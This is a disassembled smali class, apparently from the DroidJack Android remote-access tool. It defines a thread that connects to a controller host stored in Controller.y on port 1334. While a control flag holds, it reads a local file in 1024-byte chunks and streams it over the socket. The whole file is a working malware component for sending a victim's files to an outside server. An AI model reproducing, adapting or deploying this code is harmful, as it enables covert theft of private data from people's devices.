.class Lnet/droidjack/server/bp;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic a:Lnet/droidjack/server/bo;

.field private final synthetic b:Ljava/io/FileInputStream;


# direct methods
.method constructor <init>(Lnet/droidjack/server/bo;Ljava/io/FileInputStream;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/bp;->a:Lnet/droidjack/server/bo;

    iput-object p2, p0, Lnet/droidjack/server/bp;->b:Ljava/io/FileInputStream;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    :try_start_0
    new-instance v0, Ljava/net/Socket;

    sget-object v1, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    const/16 v2, 0x536

    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    new-instance v1, Ljava/io/BufferedOutputStream;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/io/BufferedOutputStream;-><init>(Ljava/io/OutputStream;)V

    const/16 v0, 0x400

    new-array v0, v0, [B

    :goto_0
    iget-object v2, p0, Lnet/droidjack/server/bp;->a:Lnet/droidjack/server/bo;

    invoke-static {v2}, Lnet/droidjack/server/bo;->a(Lnet/droidjack/server/bo;)Lnet/droidjack/server/bn;

    move-result-object v2

    invoke-static {v2}, Lnet/droidjack/server/bn;->a(Lnet/droidjack/server/bn;)Z

    move-result v2

    if-nez v2, :cond_0

    invoke-virtual {v1}, Ljava/io/BufferedOutputStream;->close()V

    iget-object v0, p0, Lnet/droidjack/server/bp;->b:Ljava/io/FileInputStream;

    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    :goto_1
    return-void

    :cond_0
    iget-object v2, p0, Lnet/droidjack/server/bp;->b:Ljava/io/FileInputStream;

    invoke-virtual {v2, v0}, Ljava/io/FileInputStream;->read([B)I

    move-result v2

    const/4 v3, 0x0

    invoke-virtual {v1, v0, v3, v2}, Ljava/io/BufferedOutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method
